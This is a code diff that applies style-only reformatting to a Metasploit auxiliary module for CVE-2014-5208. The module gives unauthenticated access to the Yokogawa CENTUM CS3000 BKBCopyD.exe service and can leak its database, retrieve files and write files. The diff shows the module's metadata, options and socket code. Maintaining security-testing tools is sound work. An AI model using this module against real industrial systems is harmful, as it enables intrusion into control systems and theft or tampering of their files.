@@ -9,34 +9,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Yokogawa BKBCopyD.exe Client',
-      'Description'    => %q{
-        This module allows an unauthenticated user to interact with the Yokogawa
-        CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR
-        operations.
-      },
-      'Author'         =>
-        [ 'Unknown' ],
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Yokogawa BKBCopyD.exe Client',
+        'Description' => %q{
+          This module allows an unauthenticated user to interact with the Yokogawa
+          CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR
+          operations.
+        },
+        'Author' => [ 'Unknown' ],
+        'References' => [
           [ 'CVE', '2014-5208' ],
           [ 'URL', 'https://blog.rapid7.com/2014/08/09/r7-2014-10-disclosure-yokogawa-centum-cs3000-bkbcopydexe-file-system-access']
         ],
-      'Actions'     =>
-        [
+        'Actions' => [
           ['PMODE', { 'Description' => 'Leak the current database' }],
-          ['RETR',  { 'Description' => 'Retrieve remote file' }],
-          ['STOR',  { 'Description' => 'Store remote file' }]
+          ['RETR', { 'Description' => 'Retrieve remote file' }],
+          ['STOR', { 'Description' => 'Store remote file' }]
         ],
-      'DisclosureDate' => '2014-08-09'))
+        'DisclosureDate' => '2014-08-09'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(20111),
         OptString.new('RPATH', [ false, 'The Remote Path (required to RETR and STOR)', "" ]),
         OptPath.new('LPATH', [ false, 'The Local Path (required to STOR)' ])
-      ])
+      ]
+    )
   end
 
   def srvport
@@ -83,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_pkt(data)
-    connect(true, {'CPORT' => @srvport})
+    connect(true, { 'CPORT' => @srvport })
     sock.put(data)
     data = sock.get_once
     disconnect
@@ -106,6 +108,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{c.peerhost} - Getting data...")
     data = c.get_once
     return unless data
+
     if @store_path.blank?
       @store_path = store_loot("yokogawa.cs3000.file", "application/octet-stream", rhost, data, datastore['PATH'])
       print_good("#{@store_path} saved!")
@@ -119,4 +122,3 @@ class MetasploitModule < Msf::Auxiliary
     stop_service
   end
 end
-
